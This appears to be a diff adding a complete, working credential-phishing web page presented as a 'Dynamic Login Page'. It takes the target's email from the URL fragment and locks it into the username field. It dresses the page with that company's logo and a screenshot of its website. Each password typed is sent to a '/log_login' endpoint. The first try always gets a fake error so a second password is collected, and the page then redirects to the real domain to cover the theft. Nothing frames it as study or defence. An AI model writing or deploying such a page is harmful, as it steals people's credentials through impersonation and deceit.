@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dynamic Login Page</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #222;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        .background {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            z-index: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #222;
+            background-size: cover;
+            background-position: center;
+            filter: blur(3px) brightness(0.85);
+            transition: background-image 0.5s;
+        }
+        .overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.4);
+            z-index: 1;
+        }
+        .login-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(255,255,255,0.95);
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+            padding: 2.5rem 2rem 2rem 2rem;
+            min-width: 340px;
+            z-index: 2;
+        }
+        .login-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+        .login-header img {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+            margin-right: 0.8rem;
+            border-radius: 8px;
+            background: #f0f0f0;
+        }
+        .login-header h2 {
+            margin: 0;
+            font-size: 1.7rem;
+            color: #222;
+            font-weight: 600;
+        }
+        .login-form label {
+            display: block;
+            margin-bottom: 0.3rem;
+            color: #444;
+            font-weight: 500;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 0.7rem;
+            margin-bottom: 1.1rem;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 1rem;
+        }
+        .login-form button {
+            width: 100%;
+            padding: 0.8rem;
+            background: #0078d4;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .login-form button:hover {
+            background: #005fa3;
+        }
+    </style>
+</head>
+<body>
+    <div class="background" id="background"></div>
+    <div class="overlay"></div>
+    <div class="login-container">
+        <div class="login-header">
+            <img id="logo" src="" alt="Logo" style="display:none;">
+            <h2><span id="sign-in-text">Sign In</span></h2>
+        </div>
+        <form class="login-form">
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username" required readonly style="background:#f5f5f5; color:#888; cursor:not-allowed;">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+            <button type="submit">Login</button>
+            <div id="login-error" style="display:none;color:#c00;font-weight:600;margin-top:1rem;text-align:center;"></div>
+        </form>
+    </div>
+    <script>
+    function getEmailFromHash() {
+        if (window.location.hash && window.location.hash.length > 1) {
+            return decodeURIComponent(window.location.hash.substring(1));
+        }
+        return null;
+    }
+
+    function getDomainFromEmail(email) {
+        const match = email.match(/@([\w.-]+)/);
+        return match ? match[1] : null;
+    }
+
+    function setBackgroundFromDomain(domain) {
+        // Use a screenshot service for the domain as background
+        // Example: https://image.thum.io/get/width/1200/crop/800/https://domain.com
+        const bgUrl = `https://image.thum.io/get/width/1200/crop/800/https://${domain}`;
+        document.getElementById('background').style.backgroundImage = `url('${bgUrl}')`;
+    }
+
+    function setLogoFromDomain(domain) {
+        // Use Clearbit Logo API
+        const logoUrl = `https://logo.clearbit.com/${domain}`;
+        const logoImg = document.getElementById('logo');
+        logoImg.src = logoUrl;
+        logoImg.style.display = 'block';
+        logoImg.onerror = function() {
+            logoImg.style.display = 'none';
+        };
+    }
+
+    function setUsername(email) {
+        document.getElementById('username').value = email;
+    }
+
+    window.onload = function() {
+        const email = getEmailFromHash();
+        if (email) {
+            setUsername(email);
+            const domain = getDomainFromEmail(email);
+            if (domain) {
+                setBackgroundFromDomain(domain);
+                setLogoFromDomain(domain);
+            }
+        }
+    };
+
+    // activity to backend
+    let loginAttempts = 0;
+    document.querySelector('.login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        fetch('/log_login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ username, password })
+        }).then(res => res.json()).then(data => {
+            loginAttempts++;
+            const errorDiv = document.getElementById('login-error');
+            if (loginAttempts === 1) {
+                errorDiv.textContent = 'Invalid password entered! Please try again.';
+                errorDiv.style.display = 'block';
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+            } else if (loginAttempts === 2) {
+                errorDiv.textContent = 'Attempt failed or account is reset.';
+                errorDiv.style.display = 'block';
+                setTimeout(() => {
+                    const domain = getDomainFromEmail(username);
+                    if (domain) {
+                        window.location.href = 'https://' + domain;
+                    } else {
+                        errorDiv.textContent = 'Could not extract domain from username.';
+                    }
+                }, 2000);
+            }
+        });
+    });
+    </script>
+</body>
+</html>
